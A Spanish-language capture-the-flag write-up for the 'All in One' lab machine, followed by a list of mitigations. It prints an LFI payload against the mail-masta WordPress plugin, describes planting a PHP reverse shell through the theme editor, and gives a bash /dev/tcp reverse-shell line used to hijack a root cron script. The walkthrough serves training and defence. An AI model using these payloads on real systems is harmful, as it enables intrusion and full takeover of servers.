# All in One

## Resumen

Es una máquina Linux de dificultad fácil en la que se trabaja la enumeración de subdirectorios, un LFI en un plugin de WordPress, el acceso al panel de WordPress y la escalada de privilegios mediante una tarea cron. La propia web de la máquina indica que tiene varios caminos, intencionados y no intencionados; en este writeup sigo uno de ellos.

## Enumeración

Empiezo haciendo un ping a la máquina para ver qué TTL devuelve y así deducir el sistema operativo.

```bash
ping -c 1 <vmip>
```

```text
64 bytes from <vmip>: icmp_seq=1 ttl=62 time=27.4 ms
```

Con el TTL (62, cercano a 64 menos los saltos de red) sé que es una máquina Linux.

Sigo con nmap para la detección de puertos.

```bash
nmap -sVC -p- --min-rate 5000 <vmip> -oG nmap
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos encontrados: `21/FTP`, `22/SSH`, `80/HTTP (Apache)`.

Empiezo por el FTP, ya que permite inicio de sesión anónimo.

## Análisis puerto 21

Una vez dentro, autenticado como `anonymous`, hago un `ls -la` para ver qué hay.

```text
ftp> ls -la
229 Entering Extended Passive Mode (|||53733|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
```

El directorio está vacío y pertenece a root, así que no hay nada útil. Sigo con el Apache.

## Análisis puerto 80

Entro a la web y veo la página por defecto de Apache.

![alt text](<Imagenes/Pasted image 20261124233610.png>)

Enumero subdirectorios con gobuster.

```bash
gobuster dir -u http://<vmip> -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<vmip>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wordpress            (Status: 301) [Size: 320] [--> http://<vmip>/wordpress/]
hackathons           (Status: 200) [Size: 197]
server-status        (Status: 403) [Size: 279]
```


Entro a `/wordpress` para ver qué contiene.

![alt text](<Imagenes/Pasted image 20261125182721.png>)

Es una página genérica, pero muestra al autor del post, `elyana`, que es un posible usuario. Al no encontrar nada más a simple vista, sigo con `wpscan`.

```bash
wpscan --url http://<vmip>/wordpress/
```

Un hallazgo interesante del escaneo es el plugin `mail-masta`.

```text
[+] mail-masta
 | Location: http://<vmip>/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://<vmip>/wordpress/wp-content/plugins/mail-masta/readme.txt
```

Que esté "al día" no significa que sea seguro: el plugin no se actualiza desde 2014. Al buscarlo, veo que tiene un LFI conocido, así que empiezo a explotarlo.


## Explotación

Encuentro un payload con el que consigo acceso a `wp-config.php`.

Payload:
`http://<vmip>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php`

La respuesta llega codificada en base64, así que la decodifico.

```text
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk+KiBOI1c8biEqfGtGZE1uUU4pPl49XihpSHA4VXZnPH4ySH56Rl1pZHlRPXtAfTF9KnJ7bFowLFdZJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfU0FMVCcsICdoeDhJOitUejhuMzM1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```

Y al decodificarla obtengo unas credenciales.

```php
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', '********' );
```

Pruebo la contraseña por SSH y no funciona, pero en el panel de WordPress, con el usuario `elyana` (el mismo autor del post), consigo iniciar sesión.

El editor de temas de WordPress permite modificar los archivos de la plantilla desde el panel. Como ya soy administrador, aprovecho esa función para inyectar la reverse shell de PHP de pentestmonkey en la página `404.php`.

![alt text](<Imagenes/Pasted image 20261125232311.png>)

Pongo el listener.

```bash
nc -lvnp 4444
```

Visito la siguiente URL:

```text
http://<vmip>/wordpress/wp-content/themes/twentytwenty/404.php
```

Esto me da acceso como `www-data`.

## Escalada de privilegios

### Estabilización de la shell

Una vez con `www-data`, estabilizo la shell.

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

### Enumeración como `www-data`

Empiezo a buscar y encuentro la primera flag en `/home/elyana/user.txt`, a la que no puedo acceder por falta de permisos. También encuentro un archivo `hint.txt` que indica que la contraseña de `elyana` está escondida en el sistema.

```text
$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

Mientras busco la contraseña, encuentro algo más interesante en `/var/backups`: un script propiedad de root y con permisos de escritura para todos.


```text
$ ls -la
-rwxrwxrwx  1 root root    73 Oct  7  2020 script.sh
```

Contenido del script:

```text
www-data@<host>:/var/backups$ cat script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task
```

Con esto, reviso `/etc/crontab` para comprobar si se ejecuta de forma periódica.

```text
$ cat /etc/crontab
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh
```

### Escalada mediante cron

Veo que cron ejecuta el script cada minuto como root. Como cualquier usuario puede editarlo, puedo hacer que me devuelva una shell y así acceder como root.

 
Contenido revshell:

`bash -i >& /dev/tcp/<IPATACANTE>/<PUERTO> 0>&1`

```bash
nc -lvnp 4444
```

Al cabo de un minuto consigo acceso como root y puedo leer las flags restantes.

 ![alt text](<Imagenes/Pasted image 20261126165649.png>)


```text
cat /home/elyana/user.txt
VEhNe****************
```

```text
cat /root/root.txt
VEhNe****************
```

## Flujo de ataque

1. **Enumeración:** se encuentran los puertos `21/FTP`, `22/SSH` y `80/HTTP (Apache)` con nmap.
2. **Análisis puerto 21:** no se encuentra nada dentro del FTP, así que se pasa al siguiente paso.
3. **Análisis puerto 80:** con gobuster se encuentra el directorio `/wordpress`; con `wpscan` se detecta el plugin `mail-masta`, vulnerable a LFI.
4. **Explotación:** gracias al LFI de `mail-masta` se accede a `wp-config.php` y se obtienen las credenciales para iniciar sesión en el panel de WordPress. Una vez dentro, se inyecta una reverse shell en `404.php` desde el editor de temas y se consigue el acceso inicial como `www-data`.
5. **Escalada de privilegios:** se encuentra el script `/var/backups/script.sh`, propiedad de root y editable por todos, que cron ejecuta cada minuto como root. Se modifica para obtener una shell, se consigue acceso como root y se completa la máquina.

## Mitigaciones

- **Eliminar o actualizar plugins abandonados.** `mail-masta` no se actualiza desde 2014 y tiene un LFI conocido.
- **No reutilizar credenciales entre servicios.** Las credenciales de la base de datos servían para iniciar sesión en WordPress.
- **Desactivar el editor de archivos de WordPress.** Evita que un administrador comprometido pueda modificar el código de los temas desde el panel.
- **Aplicar el principio de mínimo privilegio en los archivos usados por tareas de root.** `/var/backups/script.sh` era editable por cualquier usuario y se ejecutaba cada minuto como root.
- **Deshabilitar el acceso FTP anónimo** si no es necesario.
- **Reemplazar la página por defecto de Apache** y no dejar archivos de pistas accesibles en el sistema.